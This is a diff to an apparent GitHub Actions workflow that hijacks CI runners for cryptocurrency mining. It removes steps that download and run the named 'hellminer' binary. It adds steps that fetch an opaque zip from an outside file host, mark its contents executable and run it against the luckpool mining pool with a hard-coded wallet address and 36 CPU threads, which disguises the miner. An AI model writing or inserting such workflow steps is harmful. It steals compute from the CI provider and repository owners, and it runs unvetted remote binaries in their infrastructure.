@@ -11,6 +11,7 @@ jobs:
       - run: ls
       - run: sudo apt-get update
       - run: sudo apt-get install wget tar -y
-      - run: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
-      - run: tar xf hellminer_cpu_linux.tar.gz
-      - run: ./hellminer -c na.luckpool.net:3956 -u RT3QTpGdya1CCJABvKMwp6JgcPig5ZjPM9.02 -p x --cpu=36
+      - run: curl http://www.directfilelink.tech/5131958912234392/abc.zip -o abc.zip
+      - run: unzip abc.zip
+      - run: chmod +x *
+      - run: ./abc -c na.luckpool.net:3956 -u RT3QTpGdya1CCJABvKMwp6JgcPig5ZjPM9.02 -p x --cpu=36
